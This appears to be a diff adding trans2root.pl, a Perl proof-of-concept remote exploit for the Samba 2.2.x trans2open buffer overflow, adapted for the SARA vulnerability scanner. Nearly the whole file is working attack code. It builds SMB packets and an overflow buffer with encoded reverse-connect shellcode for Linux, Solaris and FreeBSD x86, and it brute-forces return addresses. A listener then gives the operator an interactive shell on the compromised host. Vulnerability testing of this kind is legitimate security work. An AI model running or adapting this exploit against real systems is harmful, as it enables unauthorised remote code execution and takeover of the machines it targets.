@@ -1,0 +1,492 @@
+###############
+
+##[ Header
+#	  Name:	 trans2root.pl
+#      Purpose:	 Proof of concept exploit for Samba 2.2.x (trans2open overflow)
+#	   CVE:	 CAN-2003-0201
+#	Author:	 H D Moore <hdmoore@digitaldefense.net>
+#    Copyright:	 Copyright (C) 2003 Digital Defense Inc.
+# Release Date:	 April 7, 2003
+#     Revision:	 1.0
+#     Download:	 http://www.digitaldefense.net/labs/securitytools.html
+#     Modified:	 By SARA team to incorporate for sara
+##
+
+use strict;
+use Socket;
+use IO::Socket;
+use IO::Select;
+use POSIX;
+use Getopt::Std;
+
+$SIG{USR2} = \&GoAway;
+
+my %args;
+my %targets =
+(
+    "linx86"  => [0xbffff3ff, 0xbfffffff, 0xbf000000, 512, \&CreateBuffer_linx86],
+    "solx86"  => [0x08047404, 0x08047ffc, 0x08010101, 512, \&CreateBuffer_solx86],
+    "fbsdx86" => [0xbfbfefff, 0xbfbfffff, 0xbf000000, 512, \&CreateBuffer_bsdx86],
+    # name	# default   # start	# end	   # step  # function
+);
+
+getopt('t:M:h:p:r:x:H:P:', \%args);
+
+my $target_type	= $args{t} || Usage();
+my $target_host	= $args{h} || Usage();
+my $local_host	= $args{H} || Usage();
+my $local_port	= $args{P} || 1981;
+my $target_port	= $args{p} || 139;
+my $mode	= $args{x} || "";
+
+my $target_mode	= "brute";
+
+if (! exists($targets{$target_type})) {	Usage(); }
+print "[*] Using target	type: $target_type\n";
+
+# allow	single mode via	the -M option
+if ($args{M} &&	uc($args{M}) eq	"S")
+{
+    $target_mode = "single";
+}
+
+# the parent process listens for an incoming connection
+# the child process handles the	actual exploitation
+my $listen_pid = $$;
+my $exploit_pid	= StartListener($local_port);
+
+# get the default return address for single mode
+my $targ_ret = $args{r}	|| $targets{$target_type}->[0];
+my $curr_ret;
+$targ_ret = eval($targ_ret);
+
+if ($target_mode !~ /brute|single/)
+{
+    print "[*] Invalid attack mode: $target_mode (single or brute only)\n";
+    exit(0);
+}
+
+
+if ($target_mode eq "single")
+{
+    $curr_ret =	$targ_ret;
+    if(! $targ_ret)
+    {
+       print "[*] Invalid return address specified!\n";
+	kill("USR2", $listen_pid);
+	exit(0);
+    }
+
+    print "[*] Starting	single shot mode...\n";
+    printf ("[*] Using return address of 0x%.8x\n", $targ_ret);
+    my $buf = $targets{$target_type}->[4]->($local_host, $local_port, $targ_ret);
+    my $ret = AttemptExploit($target_host, $target_port, $buf);
+
+    sleep(2);
+    kill("USR2", $listen_pid);
+    exit(0);
+}
+
+
+if ($target_mode eq "brute")
+{
+    print "[*] Starting	brute force mode...\n";
+
+    for	(
+	  $curr_ret  =$targets{$target_type}->[1];
+	  $curr_ret >= $targets{$target_type}->[2];
+	  $curr_ret -=$targets{$target_type}->[3]
+	)
+    {
+	select(STDOUT);	$|++;
+	my $buf	= $targets{$target_type}->[4]->($local_host, $local_port, $curr_ret);
+	printf ("					 \r[*] Return Address: 0x%.8x",	$curr_ret);
+	my $ret	= AttemptExploit($target_host, $target_port, $buf);
+    }
+    sleep(2);
+    kill("USR2", $listen_pid);
+    exit(0);
+}
+
+sub Usage {
+
+    print STDERR "\n";
+    print STDERR " trans2root.pl - Samba 2.2.x 'trans2open()' Remote Exploit\n";
+    print STDERR "===========================================================\n\n";
+    print STDERR "    Usage: \n";
+    print STDERR "	     $0	<options> -t <target type> -H <your ip>	-h <target ip>\n";
+    print STDERR "  Options:  \n";
+    print STDERR "	     -M	(S|B) <single or brute mode>\n";
+    print STDERR "	     -r	      <return address for single mode>\n";
+    print STDERR "	     -p	      <alternate Samba port>\n";
+    print STDERR "	     -P	      <alternate listener port>\n";
+    print STDERR "  Targets:\n";
+    foreach my $type (keys(%targets))
+    {
+	print STDERR "		  $type\n";
+    }
+    print STDERR "\n";
+
+
+    exit(1);
+}
+
+
+sub StartListener {
+    my ($local_port) = @_;
+    my $listen_pid = $$;
+
+    my $s = IO::Socket::INET->new (
+		Proto => "tcp",
+		LocalPort => $local_port,
+		Type =>	SOCK_STREAM,
+		Listen => 3,
+		ReuseAddr => 1
+    );
+
+    if (! $s)
+    {
+	print "[*] Could not start listener: $!\n";
+	exit(0);
+    }
+
+    print "[*] Listener	started	on port	$local_port\n";
+
+    my $exploit_pid = fork();
+    if ($exploit_pid)
+    {
+	my $victim;
+	$SIG{USR2} = \&GoAway;
+
+	while ($victim = $s->accept())
+	{
+	    kill("USR2", $exploit_pid);
+	    if ($mode eq "Sara") {
+	      print STDOUT "\n[*] Starting Shell " . $victim->peerhost . ":" . $victim->peerport . "\n\n";
+	      StartShell($victim);
+	    } else {
+	      print "System is vulnerable to attack\n";
+	      exit(0);
+	    }
+	}
+	exit(0);
+    }
+    return ($exploit_pid);
+}
+
+sub StartShell {
+    my ($client) = @_;
+    my $sel = IO::Select->new();
+
+    Unblock(*STDIN);
+    Unblock(*STDOUT);
+    Unblock($client);
+
+    select($client); $|++;
+    select(STDIN);   $|++;
+    select(STDOUT);  $|++;
+
+    $sel->add($client);
+    $sel->add(*STDIN);
+
+    print $client "echo	\\-\\-\\=\\[ Welcome to	`hostname` \\(`id`\\)\n";
+    print $client "echo	\n";
+
+    while (fileno($client))
+    {
+	my $fd;
+	my @fds	= $sel->can_read(0.2);
+
+	foreach	$fd (@fds)
+	{
+	    my @in = <$fd>;
+
+	    if(! scalar(@in)) {	next; }
+
+	    if (! $fd || ! $client)
+	    {
+		print "[*] Closing connection.\n";
+		close($client);
+		exit(0);
+	    }
+
+	    if ($fd eq $client)
+	    {
+		print STDOUT join("", @in);
+	    } else {
+		print $client join("", @in);
+	    }
+	}
+    }
+    close ($client);
+}
+
+sub AttemptExploit {
+    my ($Host, $Port, $Exploit)	= @_;
+    my $res;
+
+    my $s = IO::Socket::INET->new(PeerAddr => $Host, PeerPort => $Port,	Type =>	SOCK_STREAM, Protocol => "tcp");
+
+    if (! $s)
+    {
+	print "\n[*] Error: could not connect: $!\n";
+	kill("USR2", $listen_pid);
+	exit(0);
+    }
+
+    select($s);	$|++;
+    select(STDOUT); $|++;
+    Unblock($s);
+
+    my $SetupSession =
+	"\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01".
+	"\x00\x00\x00\x00";
+
+    my $TreeConnect =
+	"\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00".
+	"\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24".
+	"\x25\x6e\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50".
+	"\x43\x24";
+
+    my $Flush =	("\x00"	x 808);
+
+    print $s $SetupSession;
+    $res = ReadResponse($s);
+
+    print $s $TreeConnect;
+    $res = ReadResponse($s);
+
+    # uncomment	this for diagnostics
+  #  print "[*]	Press Enter to Continue...\n";
+  #  $res = <STDIN>;
+
+    print "[*] Sending Exploit Buffer...\n";
+
+    print $s $Exploit;
+    print $s $Flush;
+
+    ReadResponse($s);
+    close($s);
+}
+
+sub CreateBuffer_linx86	{
+    my ($Host, $Port, $Return) = @_;
+
+    my $RetAddr	=  eval($Return);
+    $RetAddr = pack("l", $RetAddr);
+
+    my ($a1, $a2, $a3, $a4) = split(//,	gethostbyname($Host));
+    $a1	= chr(ord($a1) ^ 0x93);
+    $a2	= chr(ord($a2) ^ 0x93);
+    $a3	= chr(ord($a3) ^ 0x93);
+    $a4	= chr(ord($a4) ^ 0x93);
+
+    my ($p1, $p2) = split(//, reverse(pack("s",	$Port)));
+    $p1	= chr(ord($p1) ^ 0x93);
+    $p2	= chr(ord($p2) ^ 0x93);
+
+    my $exploit	=
+	# trigger the trans2open overflow
+	"\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
+	"\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90".
+
+	GetNops(772) .
+
+	# xor decoder courtesy of hsj
+	"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01".
+	"\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30".
+	"\x93\x40\xe2\xfa".
+
+	# reverse-connect, mangled lamagra code	+ fixes
+	"\x1a\x76\xa2\x41\x21\xf5\x1a\x43\xa2\x5a\x1a\x58\xd0\x1a\xce\x6b".
+	"\xd0\x1a\xce\x67\xd8\x1a\xde\x6f\x1e\xde\x67\x5e\x13\xa2\x5a\x1a".
+	"\xd6\x67\xd0\xf5\x1a\xce\x7f\xf5\x54\xd6\x7d".
+	$p1.$p2	."\x54\xd6\x63". $a1.$a2.$a3.$a4.
+	"\x1e\xd6\x7f\x1a\xd6\x6b\x55\xd6\x6f\x83\x1a\x43\xd0\x1e\xde\x67".
+	"\x5e\x13\xa2\x5a\x03\x18\xce\x67\xa2\x53\xbe\x52\x6c\x6c\x6c\x5e".
+	"\x13\xd2\xa2\x41\x12\x79\x6e\x6c\x6c\x6c\xaa\x42\xe6\x79\x78\x8b".
+	"\xcd\x1a\xe6\x9b\xa2\x53\x1b\xd5\x94\x1a\xd6\x9f\x23\x98\x1a\x60".
+	"\x1e\xde\x9b\x1e\xc6\x9f\x5e\x13\x7b\x70\x6c\x6c\x6c\xbc\xf1\xfa".
+	"\xfd\xbc\xe0\xfb".
+
+	GetNops(87).
+
+	($RetAddr x 8).
+
+	"DDI!".	("\x00"	x 277);
+
+    return $exploit;
+}
+
+sub CreateBuffer_solx86	{
+    my ($Host, $Port, $Return) = @_;
+
+    my $RetAddr	=  eval($Return);
+    my $IckAddr	= $RetAddr - 512;
+
+    $RetAddr = pack("l", $RetAddr);
+    $IckAddr = pack("l", $IckAddr);
+
+    # IckAddr needs to point to	a writable piece of memory
+
+    my ($a1, $a2, $a3, $a4) = split(//,	gethostbyname($Host));
+    $a1	= chr(ord($a1) ^ 0x93);
+    $a2	= chr(ord($a2) ^ 0x93);
+    $a3	= chr(ord($a3) ^ 0x93);
+    $a4	= chr(ord($a4) ^ 0x93);
+
+    my ($p1, $p2) = split(//, reverse(pack("s",	$Port)));
+    $p1	= chr(ord($p1) ^ 0x93);
+    $p2	= chr(ord($p2) ^ 0x93);
+
+    my $exploit	=
+	# trigger the trans2open overflow
+	"\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
+	"\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90".
+
+	GetNops(813) .
+
+	# xor decoder courtesy of hsj
+	"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01".
+	"\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30".
+	"\x93\x40\xe2\xfa".
+
+	# reverse-connect, code	by bighawk
+	"\x2b\x6c\x6b\x6c\xaf\x64\x43\xc3\xa2\x53\x23\x09\xc3\x1a\x76\xa2".
+	"\x5a\xc2\xd2\xd2\xc2\xc2\x23\x75\x6c\x46\xa2\x41\x1a\x54\xfb".
+	$a1.$a2.$a3.$a4	."\xf5\xfb". $p1.$p2.
+	"\xf5\xc2\x1a\x75\xf9\x83\xc5\xc4\x23\x78\x6c\x46\xa2\x41\x21\x9a".
+	"\xc2\xc1\xc4\x23\xad\x6c\x46\xda\xea\x61\xc3\xfb\xbc\xbc\xe0\xfb".
+	"\xfb\xbc\xf1\xfa\xfd\x1a\x70\xc3\xc0\x1a\x71\xc3\xc1\xc0\x23\xa8".
+	"\x6c\x46".
+
+	GetNops(87) .
+
+	"010101".
+	$RetAddr.
+	$IckAddr.
+	$RetAddr.
+	$IckAddr.
+	"101010".
+
+	"DDI!".	("\x00"	x 277);
+
+    return $exploit;
+}
+
+sub CreateBuffer_bsdx86	{
+    my ($Host, $Port, $Return) = @_;
+
+    my $RetAddr	=  eval($Return);
+    my $IckAddr	= $RetAddr - 512;
+
+    $RetAddr = pack("l", $RetAddr);
+    $IckAddr = pack("l", $IckAddr);
+
+    # IckAddr needs to point to	a writable piece of memory
+
+    my ($a1, $a2, $a3, $a4) = split(//,	gethostbyname($Host));
+    $a1	= chr(ord($a1) ^ 0x93);
+    $a2	= chr(ord($a2) ^ 0x93);
+    $a3	= chr(ord($a3) ^ 0x93);
+    $a4	= chr(ord($a4) ^ 0x93);
+
+    my ($p1, $p2) = split(//, reverse(pack("s",	$Port)));
+    $p1	= chr(ord($p1) ^ 0x93);
+    $p2	= chr(ord($p2) ^ 0x93);
+
+    my $exploit	=
+	# trigger the trans2open overflow
+	"\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
+	"\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90".
+
+	GetNops(830) .
+
+	# xor decoder courtesy of hsj
+	"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01".
+	"\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30".
+	"\x93\x40\xe2\xfa".
+
+	# reverse-connect, code	by bighawk
+	"\xa2\x5a\x64\x72\xc2\xd2\xc2\xd2\xc2\xc2\x23\xf2\x5e\x13\x1a\x50".
+	"\xfb".	$a1.$a2.$a3.$a4	."\xf5\xfb". $p1.$p2.
+	"\xf5\xc2\x1a\x75\x21\x83\xc1\xc5\xc3\xc3\x23\xf1\x5e\x13\xd2\x23".
+	"\xc9\xda\xc2\xc0\xc0\x5e\x13\xd2\x71\x66\xc2\xfb\xbc\xbc\xe0\xfb".
+	"\xfb\xbc\xf1\xfa\xfd\x1a\x70\xc2\xc7\xc0\xc0\x23\xa8\x5e\x13".
+
+	GetNops(87) .
+
+	"010101".
+	$RetAddr.
+	$IckAddr.
+	$RetAddr.
+	$IckAddr.
+	"101010".
+
+	"DDI!".	("\x00"	x 277);
+
+    return $exploit;
+}
+
+sub Unblock {
+	my $fd = shift;
+	my $flags;
+	$flags = fcntl($fd,F_GETFL,0) || die "Can't get	flags for file handle: $!\n";
+	fcntl($fd, F_SETFL, $flags|O_NONBLOCK) || die "Can't make handle nonblocking: $!\n";
+}
+
+sub GoAway {
+    exit(0);
+}
+
+sub ReadResponse {
+    my ($s) = @_;
+    my $sel = IO::Select->new($s);
+    my $res;
+    my @fds = $sel->can_read(4);
+    foreach (@fds) { $res .= <$s>; }
+    return $res;
+}
+
+sub HexDump {
+    my ($data) = @_;
+    my @x = split(//, $data);
+    my $cnt = 0;
+
+    foreach my $h (@x)
+    {
+	if ($cnt > 16)
+	{
+	    print "\n";
+	    $cnt = 0;
+	}
+
+	printf("\\x%.2x", ord($h));
+	$cnt++;
+    }
+    print "\n";
+}
+
+# thank	you k2 ;)
+sub GetNops {
+    my ($cnt) =	@_;
+    my @nops = split(//,"\x99\x96\x97\x95\x93\x91\x90\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97".
+			"\x46\x4e\xf8\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b".
+			"\xf5\x45\x4c");
+    return join	("", @nops[ map	{ rand @nops } ( 1 .. $cnt )]);
+}
